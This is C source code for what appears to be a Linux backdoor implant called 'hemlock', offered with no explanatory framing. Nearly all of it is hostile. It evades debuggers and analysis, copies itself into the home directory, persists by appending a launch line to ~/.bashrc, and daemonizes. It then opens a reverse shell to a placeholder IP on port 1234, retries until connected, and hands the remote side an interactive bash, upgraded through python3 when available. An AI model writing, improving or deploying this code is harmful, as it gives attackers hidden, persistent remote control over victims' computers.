
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <time.h>
#include <sys/stat.h>

#define IP "ip here"
#define PORT 1234

void anti_debug() {
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        exit(1);
    }
}

void anti_analysis() {
    volatile int x = 0;
    for (volatile int i = 0; i < 1000000; i++) {
        x += i % 3;
    }
}

void delay_execution() {
    struct timespec ts = {1, 500000000};
    nanosleep(&ts, NULL);
}

int check_python3() {
    FILE *fp;
    char path[1035];
    fp = popen("ps aux | grep '[p]ython3'", "r");
    if (fp == NULL) {
        return -1;
    }
    while (fgets(path, sizeof(path), fp) != NULL) {
        if (strstr(path, "python3")) {
            pclose(fp);
            return 1;
        }
    }
    pclose(fp);
    return 0;
}

void hijack_python3() {
    pid_t pid = fork();
    if (pid == 0) {
        execlp("sh", "sh", "-c", "export TERM=xterm-256color; python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", NULL);
        exit(1);
    } else if (pid > 0) {
        wait(NULL);
    }
}

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) {
        exit(1);
    }
    if (pid > 0) {
        exit(0);
    }
    if (setsid() < 0) {
        exit(1);
    }
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    pid = fork();
    if (pid < 0) {
        exit(1);
    }
    if (pid > 0) {
        exit(0);
    }
    if (chdir("/") != 0) {
        exit(1);
    }
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

void self_replit(const char *self_path) {
    char home_path[512];
    snprintf(home_path, sizeof(home_path), "%s/.hemlock", getenv("HOME"));

    struct stat st;
    if (stat(home_path, &st) == 0) {
        return;
    }

    char command[1024];
    snprintf(command, sizeof(command), "cp %s %s && chmod +x %s", self_path, home_path, home_path);
    if (system(command) != 0) {
        fprintf(stderr, "ERROR!\n");
    }
}

void inject_bashrc() {
    char bashrc_path[512];
    char home_path[512];
    snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", getenv("HOME"));
    snprintf(home_path, sizeof(home_path), "%s/.hemlock", getenv("HOME"));

    FILE *file = fopen(bashrc_path, "r");
    if (file) {
        char line[1024];
        while (fgets(line, sizeof(line), file)) {
            if (strstr(line, ".hemlock")) {
                fclose(file);
                return;
            }
        }
        fclose(file);
    }

    file = fopen(bashrc_path, "a");
    if (file) {
        fprintf(file, "(sh -c 'nohup ./.hemlock > /dev/null 2>&1 < /dev/null & disown') >/dev/null 2>&1\n", home_path);
        fclose(file);
    }
}

int reverse_connection(int sockfd, struct sockaddr_in *server_addr) {
    while (connect(sockfd, (struct sockaddr *)server_addr, sizeof(*server_addr)) < 0) {
        close(sockfd);
        sleep(5);
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            exit(1);
        }
    }
    return sockfd;
}

int main(int argc, char *argv[]) {
    if (argc < 1) {
        return 1;
    }


    anti_debug();
    anti_analysis();
    delay_execution();
    

    self_replit(argv[0]);
    inject_bashrc();
    

    daemonize();

    int sockfd;
    struct sockaddr_in server_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, IP, &server_addr.sin_addr);

    sockfd = reverse_connection(sockfd, &server_addr);

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    if (check_python3()) {
        hijack_python3();
    }

    execl("/bin/bash", "/bin/bash", NULL);
    close(sockfd);
    return 0;
}
